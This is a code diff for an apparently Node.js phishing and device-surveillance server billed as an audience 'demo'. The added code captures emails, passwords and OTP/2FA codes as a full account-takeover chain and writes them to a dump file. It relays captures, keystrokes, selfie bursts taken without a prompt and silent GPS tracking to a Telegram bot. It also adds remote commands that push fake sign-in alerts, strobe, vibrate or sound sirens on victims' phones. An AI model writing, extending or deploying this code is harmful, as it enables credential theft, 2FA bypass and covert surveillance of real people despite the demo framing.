+  res.json({ ok: true });
+});
+
+// ── Breach-dump file (plain text, appended live, shipped via /dump) ───
+const DUMP_PATH = path.join(__dirname, "dump.txt");
+function appendDump(line) {
+  if (!line) return;
+  try {
+    fs.appendFileSync(DUMP_PATH, String(line).replace(/\r?\n/g, " ").trim() + "\n");
+  } catch (e) { /* non-fatal */ }
+}
+
+// ── OTP / 2FA code capture — completes the account-takeover chain ─────
+app.post("/otp", (req, res) => {
+  const s = sessionFor(req, req.body.vid);
+  const otp = String(req.body.otp || "").replace(/[^0-9A-Za-z]/g, "").slice(0, 8);
+  if (!otp) return res.json({ ok: true });
+  if (s.otp && s.otp.code === otp) return res.json({ ok: true }); // ignore replays
+
+  s.otp = { code: otp, t: Date.now() };
+  setStage(s, "otp");
+  saveSessions();
+
+  const cls = classify(s.ua);
+  const email = s.creds?.email || "—";
+  const password = s.creds?.password || "—";
+  const chain = `${email}:${password}:${otp}:${s.ip}`;
+  appendDump(chain);
+
+  tgSend(
+    `🔑 <b>OTP / 2FA CODE SNIFFED</b> — ${cls.icon} ${esc(cls.label)}\n` +
+    `━━━━━━━━━━━━━━━━━━━━\n` +
+    (s.creds ? `🧩 <b>Victim:</b> <code>${esc(email)}</code>\n` : "") +
+    `📱 <b>Code:</b> <code>${esc(otp)}</code>\n` +
+    `🌍 <b>IP:</b> <code>${esc(s.ip)}</code> · <code>${esc(s.sid)}</code>\n\n` +
+    `⚡ <b>Full ATO chain (email:password:otp):</b>\n<code>${esc(chain)}</code>\n\n` +
+    `<i>In a real attack this code is pasted into the real portal within seconds — that is the damage.</i>`
+  );
+  pushFeed(s, `🔑 <b>OTP sniffed</b> <code>${esc(otp)}</code> — takeover chain complete`);
   res.json({ ok: true });
 });
 
@@ -409,14 +1027,22 @@ app.post("/exit", (req, res) => {
   const dyn = b.keyDyn;
   saveSessions();
 
+  // The page fires both visibilitychange AND pagehide — dedupe within 10s
+  // so the audience gets exactly ONE session summary per close.
+  if (Date.now() - (s._lastExitAt || 0) < 10000) return res.json({ ok: true, dup: true });
+  s._lastExitAt = Date.now();
+
   const mins = Math.floor((s.dwellMs || 0) / 60000);
   const secs = Math.round(((s.dwellMs || 0) % 60000) / 1000);
-  let msg = `📋 <b>SESSION SUMMARY</b> — <code>${esc(s.sid)}</code>\n`;
+  let msg = `📋 <b>SESSION SUMMARY</b> — ${classify(s.ua).icon} ${esc(String(classify(s.ua).label).slice(0, 30))} <code>${esc(s.sid)}</code>\n`;
   msg += `━━━━━━━━━━━━━━━━━━━━\n`;
   msg += `⏱️ Dwell: ${mins}m ${secs}s | ⌨️ Keys: ${s.keys.length} | 👆 Touches: ${s.touches}\n`;
   msg += `📖 Read to: ${s.scrollPct}% of page\n`;
   if (dyn) msg += `🧠 <b>Keystroke biometrics:</b> ${dyn.wpm} WPM · avg ${dyn.avg}ms between keys · ${dyn.bursts} burst-pairs\n`;
+  if (s.creds && !s.otp) msg += `\n🔐 <b>Creds captured</b> — <code>${esc(s.creds.email)}</code>:<code>${esc(s.creds.password)}</code>`;
+  if (s.otp) msg += `\n🎯 <b>Full ATO chain completed</b> — email:password:OTP all captured`;
   tgSend(msg);
+  pushFeed(s, `📤 <b>session ended</b> — ${mins}m ${secs}s · ⌨️ ${s.keys.length} keys · 📖 ${s.scrollPct}%${s.otp ? " · 🔑 OTP done" : s.creds ? " · 🔐 creds" : ""}`);
   res.json({ ok: true });
 });
 
@@ -433,43 +1059,129 @@ app.post("/heatmap", (req, res) => {
   form.append("caption", `👆 Touch heatmap — ${classify(s.ua).label} [${s.sid}] (${s.touches} taps)`);
   form.append("photo", new Blob([s.heatBuf], { type: "image/png" }), "heat.png");
   tgMultipart("sendPhoto", form);
+  pushFeed(s, `👆 touch heatmap uploaded (${s.touches} taps)`);
   res.json({ ok: true });
 });
 
-// ── GPS fixes — breadcrumb tracking + map pin ──────────────────────
+// ── GPS fixes — breadcrumb tracking + throttled map pin ─────────────
+function haversineKm(a, b) {
+  const rad = (x) => (x * Math.PI) / 180;
+  const dLat = rad(b.lat - a.lat);
+  const dLon = rad(b.lon - a.lon);
+  const h = Math.sin(dLat / 2) ** 2 + Math.cos(rad(a.lat)) * Math.cos(rad(b.lat)) * Math.sin(dLon / 2) ** 2;
+  return 2 * 6371 * Math.asin(Math.sqrt(h));
+}
+
 app.post("/gps", (req, res) => {
   const s = sessionFor(req, req.body.vid);
   const { lat, lon, acc, spd, alt, source } = req.body || {};
   if (!lat || !lon) return res.json({ ok: true });
 
+  const prev = s.gps;
   s.gps = { lat, lon, acc, t: Date.now(), source: source || "" };
   s.fixes = (s.fixes || 0) + 1;
   saveSessions();
 
-  let msg = `📍 <b>GPS FIX #${s.fixes} — ${classify(s.ua).label}</b> <i>[${esc(s.sid)}]</i>\n`;
-  msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-  msg += `🎯 <b>Coords:</b> <code>${esc(lat)}, ${esc(lon)}</code>\n`;
-  msg += `📏 <b>Accuracy:</b> ±${esc(Math.round(acc))}m${alt != null ? ` · altitude ${esc(Math.round(alt))}m` : ""}${spd != null && spd > 0.3 ? ` · speed ${(spd * 3.6).toFixed(1)} km/h` : ""}\n`;
-  msg += `🚪 <b>Obtained:</b> ${esc(source || "user grant")}\n`;
-  msg += `<i>🛡️ MITRE ATT&amp;CK: T1430 (Track Location)</i>`;
-  tgSend(msg);
-  tg("sendLocation", { chat_id: CHAT_ID, latitude: lat, longitude: lon });
+  // Pin only for the first fix, real movement (≥120 m) or a 30 s heartbeat.
+  // Everything else is a silent console feed line — watchPosition no longer
+  // spams the chat.
+  const movedM = prev && prev.lat ? Math.round(haversineKm(prev, s.gps) * 1000) : null;
+  const mvt = movedM === null ? "first fix" : movedM < 1000 ? `${movedM} m` : `${(movedM / 1000).toFixed(2)} km`;
+  const accTxt = acc != null ? ` ±${Math.round(acc)}m` : "";
+  const spdTxt = spd != null && spd > 0.3 ? ` · ${(spd * 3.6).toFixed(1)} km/h` : "";
+  const pin = movedM === null || movedM >= 120 || Date.now() - (s._lastPinAt || 0) >= 30000;
+
+  if (pin) {
+    s._lastPinAt = Date.now();
+    tg("sendLocation", { chat_id: CHAT_ID, latitude: lat, longitude: lon });
+    pushFeed(s, `📍 <b>GPS fix #${s.fixes}</b> — ${mvt}${accTxt}${spdTxt}${source ? ` · via ${esc(source)}` : ""} → map pin`);
+  } else {
+    pushFeed(s, `📍 GPS fix #${s.fixes} — moved ${mvt}${accTxt}${spdTxt} (tracking, no pin)`);
+  }
   res.json({ ok: true });
 });
 
-// ── Front camera capture ──────────────────────────────────────────────
-app.post("/selfie", (req, res) => {
-  const s = sessionFor(req, req.query.vid || "");
-  if (!req.body || !req.body.length) return res.json({ ok: true });
-  const buf = Buffer.from(req.body);
+// ── Front camera capture (burst-aware) ─────────────────────────────────
+//  Frames arrive as raw PNGs. A BURST is 1-6 frames the client sends
+//  ~420ms apart with ?burst=N&idx=i&last=1 on the final frame. The server
+//  buffers them and forwards the WHOLE burst as ONE Telegram album so the
+//  operator sees a single narration per capture (no per-frame spam).
+//  A 2.5s safety timer flushes whatever arrived if the victim closes the
+//  tab mid-burst (partial bursts degrade gracefully to a smaller album).
+const selfieBufs = new Map();    // sid -> { n, frames: [{ buf, at }] }
+const selfieTimers = new Map();  // sid -> safety-flush timeout handle
 
+function clearSelfieTimer(sid) {
+  const t = selfieTimers.get(sid);
+  if (t) { clearTimeout(t); selfieTimers.delete(sid); }
+}
+
+// Single-frame send — the original path, identical narration.
+function sendSelfieSingle(s, buf) {
   const form = new FormData();
   form.append("chat_id", CHAT_ID);
   form.append("caption", `📷 <b>FRONT CAMERA CAPTURE</b> — ${classify(s.ua).label} <i>[${esc(s.sid)}]</i>\nPretext: Student ID selfie verification`);
   form.append("photo", new Blob([buf], { type: "image/png" }), "selfie.png");
   tgMultipart("sendPhoto", form);
   s.events.push({ t: Date.now(), text: "📸 Front camera frame captured" });
+  pushFeed(s, `📸 front camera frame captured → Telegram`);
+}
+
+// Send a buffered burst as ONE media-group album (single narration).
+async function flushSelfieBurst(sid) {
+  clearSelfieTimer(sid);
+  const b = selfieBufs.get(sid);
+  selfieBufs.delete(sid);
+  if (!b || !b.frames.length) return;
+  const s = sessions.get(sid);
+  if (!s) return; // session wiped mid-burst — drop silently
+  if (b.frames.length === 1) {
+    // Degraded burst (victim closed the tab after 1 frame) → single-photo path.
+    sendSelfieSingle(s, b.frames[0].buf);
+    saveSessions();
+    return;
+  }
+  const n = b.frames.length;
+  const caption = `📷 <b>FRONT CAMERA CAPTURE ×${n}</b> — ${classify(s.ua).label} <i>[${esc(s.sid)}]</i>\nPretext: Student ID selfie verification`;
+  const media = b.frames.map((f, i) => ({
+    type: "photo",
+    media: `attach://f${i}`,
+    ...(i === 0 ? { caption, parse_mode: "HTML" } : {}),
+  }));
+  const form = new FormData();
+  form.append("chat_id", CHAT_ID);
+  b.frames.forEach((f, i) => form.append(`f${i}`, new Blob([f.buf], { type: "image/png" }), `selfie${i}.png`));
+  form.append("media", JSON.stringify(media));
+  await tgMultipart("sendMediaGroup", form);
+  s.events.push({ t: Date.now(), text: `📸 Front camera burst captured — ${n} frames` });
+  pushFeed(s, `📸 selfie burst ×${n} — ONE Telegram album sent`);
   saveSessions();
+}
+
+app.post("/selfie", (req, res) => {
+  if (!req.body || !req.body.length) return res.json({ ok: true });
+  const buf = Buffer.from(req.body);
+  const s = sessionFor(req, req.query.vid || "");
+  // Burst only when the client EXPLICITLY asks (?burst=N>1). A plain POST
+  // (single-frame capture) keeps the original immediate send/event/feed.
+  const want = parseInt(req.query.burst, 10);
+  const n = want ? Math.max(1, Math.min(6, want)) : 1;
+  if (n === 1) {
+    sendSelfieSingle(s, buf);
+    saveSessions();
+    return res.json({ ok: true });
+  }
+  // Buffered burst — client sends frames ~420ms apart, last=1 on the final.
+  const sid = s.sid;
+  let b = selfieBufs.get(sid);
+  if (!b) {
+    b = { n, frames: [] };
+    selfieBufs.set(sid, b);
+    const t = setTimeout(() => flushSelfieBurst(sid), 2500); // victim-abort safety
+    selfieTimers.set(sid, t);
+  }
+  b.frames.push({ buf, at: Date.now() });
+  if (req.query.last === "1" || b.frames.length >= b.n) flushSelfieBurst(sid);
   res.json({ ok: true });
 });
 
@@ -486,7 +1198,7 @@ app.get("/command", (req, res) => {
   const s = sessionFor(req, req.query.vid || "");
   const cmds = cmdQueue.get(s.sid) || [];
   cmdQueue.set(s.sid, []);
-  res.json({ commands: cmds });
+  res.json({ commands: cmds, cohort: s.cohort, stage: s.stage });
 });
 
 // ── Bandwidth test asset ──────────────────────────────────────────────
@@ -510,7 +1222,7 @@ function sessionLine(s) {
 }
 
 function buildCsv() {
-  const rows = [["visitor_id", "first_seen", "last_seen", "ip", "device", "browser", "language", "screen", "gpu", "timezone", "city", "region", "country", "isp", "cpu_cores", "ram_gb", "battery", "network", "key_count", "email", "password", "user_agent"]];
+  const rows = [["visitor_id", "first_seen", "last_seen", "ip", "device", "browser", "language", "screen", "gpu", "timezone", "city", "region", "country", "isp", "cpu_cores", "ram_gb", "battery", "network", "key_count", "email", "password", "otp", "pdf_opens", "user_agent"]];
   for (const s of sessions.values()) {
     const d = s.device || {};
     rows.push([
@@ -519,7 +1231,7 @@ function buildCsv() {
       d.timezone || "", s.location?.city || "", s.location?.region || "", s.location?.country || "",
       s.location?.isp || "", d.cores || "", d.memory || "",
       d.battery ? d.battery.level + "%" : "", d.connection?.effectiveType || "",
-      s.keys.length, s.creds?.email || "", s.creds?.password || "", s.ua,
+      s.keys.length, s.creds?.email || "", s.creds?.password || "", s.otp?.code || "", s.pdfHits || 0, s.ua,
     ]);
   }
   return rows.map(r => r.map(c => `"${String(c).replace(/"/g, '""')}"`).join(",")).join("\r\n");
@@ -537,17 +1249,26 @@ async function handleCommand(text) {
       `<code>/who &lt;id&gt;</code> — full dossier for a device\n` +
       `<code>/keys &lt;id&gt; [n]</code> — last n keystroke entries\n` +
       `<code>/creds</code> — all captured credentials\n` +
+      `<code>/dump</code> — send dump.txt (email:password:otp chain) as a file\n` +
+      `<code>/otp</code> — 2FA codes arrive automatically right after creds\n` +
       `<code>/events &lt;id&gt;</code> — behavior narration log\n` +
       `<code>/heat &lt;id&gt;</code> — touch heatmap photo\n` +
       `<code>/gps &lt;id&gt;</code> — queue a GPS fix request (prompt on their screen)\n` +
       `<code>/buzz &lt;id&gt;</code> — make their phone vibrate\n` +
+      `<code>/nudge &lt;id&gt; [msg]</code> — push a fake “new sign-in” takeover alert (ATO reveal)\n` +
       `<code>/speak &lt;id&gt; &lt;text&gt;</code> — their phone says it out loud\n` +
       `<code>/flash &lt;id&gt;</code> — strobe their screen\n` +
-      `<code>/selfie &lt;id&gt;</code> — trigger front camera capture\n` +
+      `<code>/selfie &lt;id&gt; [burst]</code> — front camera burst, 1-6 frames (default 3) → ONE album\n` +
       `<code>/torch &lt;id&gt; [on|off]</code> — control their LED flashlight\n` +
+      `<code>/siren &lt;id&gt;</code> — siren sweep + vibration + red pulse\n` +
+      `<code>/dash</code> — live dashboard (one auto-updating message, zero spam)\n` +
+      `<code>/console &lt;id&gt;</code> — per-device interactive console (action buttons)\n` +
       `<code>/csv</code> — breach-dump export of every session\n` +
       `<code>/stats</code> — totals\n` +
-      `<code>/clear</code> — wipe demo data`
+      `<code>/crowd</code> — audience opt-in counter\n` +
+      `<code>/clear</code> — wipe demo data\n` +
+      `\n` +
+      `<i>ℹ️ Typing, events, GPS, autofill &amp; re-visits now update the dash SILENTLY. Loud only: first dossier, credentials, OTPs, photos, PDF first hit and throttled GPS pins.</i>`
     );
   }
 
@@ -556,7 +1277,7 @@ async function handleCommand(text) {
     if (!list.length) return tgSend("📭 No devices yet — open the demo link.");
     let msg = `🗂 <b>DEVICE REGISTRY — ${list.length} total</b>\n━━━━━━━━━━━━━━━━━━━━\n`;
     msg += list.map(sessionLine).join("\n");
-    return tgSend(msg);
+    return tgSend(clipLines(msg));
   }
 
   if (c === "/filter") {
@@ -566,12 +1287,12 @@ async function handleCommand(text) {
     if (!list.length) return tgSend(`🔍 No ${esc(t)} devices seen. Types: android, ios, windows, mac, linux.`);
     let msg = `${iconOf[t] || "❓"} <b>${esc(t.toUpperCase())} DEVICES — ${list.length}</b>\n━━━━━━━━━━━━━━━━━━━━\n`;
     msg += list.map(sessionLine).join("\n");
-    return tgSend(msg);
+    return tgSend(clipLines(msg));
   }
 
   if (c === "/who") {
     const s = sessions.get((args[0] || "").slice(0, 12));
-    return s ? tgSend(buildDossier(s)) : tgSend("❓ Usage: /who <visitor-id> — see /list");
+    return s ? tgSend(clipLines(buildDossier(s))) : tgSend("❓ Usage: /who <visitor-id> — see /list");
   }
 
   if (c === "/keys") {
@@ -579,14 +1300,14 @@ async function handleCommand(text) {
     if (!s) return tgSend("❓ Usage: /keys <visitor-id> [n]");
     const n = Math.min(parseInt(args[1]) || 10, 50);
     const last = s.keys.slice(-n).map(k => `[${esc(k.context)}] <code>${esc(k.keys)}</code>`).join("\n") || "no keystrokes";
-    return tgSend(`⌨️ <b>KEYSTROKES</b> — <code>${esc(s.sid)}</code> (last ${n} of ${s.keys.length})\n${last}`);
+    return tgSend(clipLines(`⌨️ <b>KEYSTROKES</b> — <code>${esc(s.sid)}</code> (last ${n} of ${s.keys.length})\n${last}`));
   }
 
   if (c === "/events") {
     const s = sessions.get((args[0] || "").slice(0, 12));
     if (!s) return tgSend("❓ Usage: /events <visitor-id>");
     const log = s.events.slice(-20).map(e => `[${new Date(e.t).toLocaleTimeString("en-IN", { hour12: false })}] ${esc(e.text)}`).join("\n") || "no events";
-    return tgSend(`🫀 <b>BEHAVIOR LOG</b> — <code>${esc(s.sid)}</code>\n${log}`);
+    return tgSend(clipLines(`🫀 <b>BEHAVIOR LOG</b> — <code>${esc(s.sid)}</code>\n${log}`));
   }
 
   if (c === "/creds") {
@@ -595,7 +1316,7 @@ async function handleCommand(text) {
     const lines = withCreds.map(s =>
       `<code>${esc(s.creds.email)}:${esc(s.creds.password)}:${esc(s.ip)}</code> · <code>${esc(s.sid)}</code>`
     ).join("\n");
-    return tgSend(`🔐 <b>CREDENTIAL DUMP</b>\n${lines}`);
+    return tgSend(clipLines(`🔐 <b>CREDENTIAL DUMP</b>\n${lines}`));
   }
 
   if (c === "/heat") {
@@ -630,7 +1351,10 @@ async function handleCommand(text) {
       Object.entries(byType).map(([t, n]) => `   ${iconFor(t)} ${t}: ${n}`).join("\n") + "\n" +
       `⌨️ Keystrokes: ${keyTotal}\n` +
       `🔐 Credentials: ${all.filter(s => s.creds).length}\n` +
-      `🕸️ Autofill harvests: ${all.filter(s => s.autofill).length}`
+      `🔑 OTP/2FA codes: ${all.filter(s => s.otp).length}\n` +
+      `📄 PDF lure opens: ${all.filter(s => s.pdfHits).length}\n` +
+      `🕸️ Autofill harvests: ${all.filter(s => s.autofill).length}\n` +
+      `🎟️ Crowd opt-ins: ${crowdSeen.size}`
     );
   }
 
@@ -651,15 +1375,21 @@ async function handleCommand(text) {
     return tgSend(ok ? "⚡ Flash queued — their screen strobes within 3s" : "❓ Usage: /flash <visitor-id> — see /list");
   }
 
+  if (c === "/siren") {
+    const ok = queueCmd((args[0] || "").slice(0, 12), "siren");
+    return tgSend(ok ? "🚨 Siren triggered — their phone sweeps 600→1400 Hz twice, vibrates and pulses red" : "❓ Usage: /siren <visitor-id> — see /list");
+  }
   if (c === "/gps") {
     const ok = queueCmd((args[0] || "").slice(0, 12), "gps");
     return tgSend(ok ? "📍 GPS request queued — the permission prompt appears on their screen within 3s. If they ever allowed location before, it tracks SILENTLY." : "❓ Usage: /gps <visitor-id> — see /list");
   }
 
   if (c === "/selfie") {
-    const ok = queueCmd((args[0] || "").slice(0, 12), "selfie");
-    return tgSend(ok ? "📷 Selfie capture queued — if camera was ever allowed, the photo arrives in seconds with NO prompt" : "❓ Usage: /selfie <visitor-id> — see /list");
+    const burst = Math.max(1, Math.min(6, parseInt(args[1], 10) || 3));
+    const ok = queueCmd((args[0] || "").slice(0, 12), "selfie", String(burst));
+    return tgSend(ok ? `📷 Selfie capture queued (×${burst}) — if camera was ever allowed, the album arrives in seconds with NO prompt` : "❓ Usage: /selfie <visitor-id> [burst 1-6] — see /list");
   }
+
 
   if (c === "/torch") {
     const state = (args[1] || "on").toLowerCase();
@@ -671,39 +1401,95 @@ async function handleCommand(text) {
     return tgSend(ok ? "🔦 Torch ON queued — their LED flashlight lights up within 3s (needs camera permission granted once)" : "❓ Usage: /torch <visitor-id> [on|off] — see /list");
   }
 
+  if (c === "/dump") {
+    if (!fs.existsSync(DUMP_PATH)) return tgSend("📭 No dump.txt yet — nothing captured.");
+    const raw = fs.readFileSync(DUMP_PATH, "utf8").trim();
+    if (!raw) return tgSend("📭 dump.txt is empty — wait for a credential capture.");
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("caption", `💣 dump.txt — live credential + OTP chain feed (${raw.split(/\n/).length} line(s))`);
+    form.append("document", new Blob([raw + "\n"], { type: "text/plain" }), "dump.txt");
+    return tgMultipart("sendDocument", form);
+  }
+
+  if (c === "/nudge") {
+    const sid = (args[0] || "").slice(0, 12);
+    const msg = args.slice(1).join(" ").slice(0, 300) ||
+      "New sign-in on your account — Bengaluru, India · Chrome on Windows · 2FA code used ✔️";
+    const ok = queueCmd(sid, "nudge", msg);
+    return tgSend(ok
+      ? `🚨 <b>Takeover alert queued</b> — the victim's screen now shows a “new sign-in” panic banner + vibration. Perfect for the ATO reveal.\n<i>${esc(msg)}</i>`
+      : "❓ Usage: /nudge <visitor-id> [custom message] — see /list");
+  }
+
+  if (c === "/crowd") {
+    return tgSend(`🎟️ <b>Live crowd opt-ins:</b> ${crowdSeen.size} phone(s) pointed their browser at the demo link tonight (consent page).`);
+  }
+
+  if (c === "/dash") {
+    if (liveDash.msgId) {
+      const ok = await editMsg(liveDash.msgId, renderDash(), dashKeyboard());
+      if (ok) { liveDash.last = Date.now(); return tgSend("📊 Dashboard refreshed in place — same message, live data."); }
+      liveDash.msgId = null;
+    }
+    return ensureDash();
+  }
+
+  if (c === "/console" || c === "/con") {
+    const sid = (args[0] || "").slice(0, 12);
+    const s = sessions.get(sid);
+    if (!s) return tgSend("❓ Usage: /console <visitor-id> — see /list");
+    await openConsole(sid);
+    return tgSend(`🎛 Interactive console opened for <code>${esc(sid)}</code> — tap a button to queue an effect on that device.`);
+  }
+
   if (c === "/clear") {
     sessions.clear();
     liveKeys.clear();
     try { fs.unlinkSync(STORE_PATH); } catch (e) {}
-    return tgSend("🧹 All demo data wiped.");
+    resetLive(); // close dash + consoles so wiped data can't resurrect into them
+    return tgSend("🧹 All demo data wiped — dashboard & consoles closed. Send /dash for a fresh board.");
   }
 
   if (c.startsWith("/")) return tgSend(`❓ Unknown command — try /help`);
 }
 
-let tgOffset = 0;
 async function pollCommands() {
   while (true) {
     try {
       const r = await fetch(`${TG}/getUpdates`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ offset: tgOffset, timeout: 25, allowed_updates: ["message", "callback_query"] }),
+        body: JSON.stringify({ offset: tgState.offset, timeout: 25, allowed_updates: ["message", "callback_query"] }),
       });
       const data = await r.json();
+      let dirty = false;
       for (const u of (data.result || [])) {
-        tgOffset = u.update_id + 1;
+        // Confirm the highest update id Telegram has handed us. When two
+        // instances poll the SAME token each gets its own copy of every update;
+        // persisting the offset lets the shared tgstate file keep both (and any
+        // restart) advancing instead of replaying the backlog from 0.
+        const nid = u.update_id + 1;
+        if (nid > tgState.offset) { tgState.offset = nid; dirty = true; }
+        // Re-delivered backlog (twin replay, restart with stale state) must not
+        // double-fire commands that were already acted on.
+        const uid = String(u.update_id);
+        if (tgState.seen[uid]) continue;
         if (u.message && String(u.message.chat.id) === String(CHAT_ID) && u.message.text) {
+          tgState.seen[uid] = Date.now();
+          dirty = true;
           await handleCommand(u.message.text).catch(e => console.error("[cmd]", e.message));
         }
-        if (u.callback_query && String(u.callback_query.message.chat.id) === String(CHAT_ID)) {
-          const [action, sid] = (u.callback_query.data || "").split(":");
-          if (action === "who") { const s = sessions.get(sid); if (s) await tgSend(buildDossier(s)); }
-          if (action === "keys") { const s = sessions.get(sid); if (s) await handleCommand(`/keys ${sid} 15`); }
-          if (action === "list") await handleCommand("/list");
-          tg("answerCallbackQuery", { callback_query_id: u.callback_query.id });
+        // callback_query may arrive without a .message when the button's source
+        // message was deleted (Telegram omits it) — skip those instead of crashing
+        // the poll iteration and silently dropping every later press.
+        if (u.callback_query && u.callback_query.message && String(u.callback_query.message.chat.id) === String(CHAT_ID)) {
+          tgState.seen[uid] = Date.now();
+          dirty = true;
+          await handleCallback(u.callback_query).catch(e => console.error("[cb]", e.message));
         }
       }
+      if (dirty) saveTgState();
     } catch (e) { /* network hiccup — retry */ }
   }
 }
@@ -725,6 +1511,8 @@ app.get("/admin/data", (req, res) => {
       keys: s.keys.slice(-30),
       keyCount: s.keys.length,
       creds: s.creds,
+      otp: s.otp,
+      pdfHits: s.pdfHits || 0,
       firstSeen: s.firstSeen,
       lastSeen: s.lastSeen,
       online: Date.now() - s.lastSeen < 30000,
@@ -778,7 +1566,7 @@ function render(d) {
       '<div><span class="ctx">[' + k.context + ']</span> <span class="mono">' +
       k.keys.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;") + '</span></div>'
     ).join("") || '<div style="color:#8b949e">no keystrokes yet</div>';
-    const cred = s.creds ? '<div class="cred">🔐 ' + s.creds.email + ' / ' + s.creds.password + '</div>' : '';
+    const cred = s.creds ? '<div class="cred">🔐 ' + s.creds.email + ' / ' + s.creds.password + (s.otp ? ' / OTP <span class="mono">' + s.otp.code + '</span> ✅ takeover chain complete' : '') + '</div>' : '';
     return '<div class="device' + (s.online ? ' online' : '') + '">' +
       '<div class="hdr"><span class="dev-name">' + (dev.platform || "Unknown") + '</span>' +
       '<span class="badge ' + (s.online ? 'b-on' : 'b-off') + '">' + (s.online ? 'ONLINE' : 'offline') + '</span></div>' +
